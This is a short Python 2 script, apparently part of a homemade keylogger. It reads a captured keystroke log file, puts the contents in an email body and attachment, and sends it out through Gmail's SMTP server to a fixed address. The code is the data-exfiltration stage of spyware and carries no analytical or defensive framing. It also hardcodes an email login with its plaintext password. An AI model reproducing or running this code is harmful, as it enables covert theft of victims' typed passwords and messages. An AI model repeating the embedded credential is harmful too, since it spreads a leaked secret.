# Import smtplib for the actual sending function
import smtplib, os

# Import the email modules we'll need
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders


# Variables to be declared
fromaddr = "matthewvinck@gmail.com"
toaddr = "vinckrm@gmail.com"

# Creating the MSG array
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Test Messgae from MRVIT"

# Read in KeyLog file to a string to put in body
dir_path = os.path.dirname(os.path.realpath(__file__))
f = open(dir_path + '\output.txt', 'r')
buffer = f.read()
f.close

# Commit buffer to body of email	
body = buffer

# attach body to the email
msg.attach(MIMEText(body, 'plain'))

# Name the file
filename = "output.txt"

# pull the attachment 
attachment = open(dir_path + "\output.txt" , "rb")
 
# Pull the attachment and parse it and encode it
part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
# Add the header info
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
# Attach the attachment to the MSG Array
msg.attach(part)
 
# The server of which to send through 
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr, "mattywow0123")

# convert the MSG array into a string format
text = msg.as_string()

# push to the server to send through
server.sendmail(fromaddr, toaddr, text)

# Quit the script
server.quit()



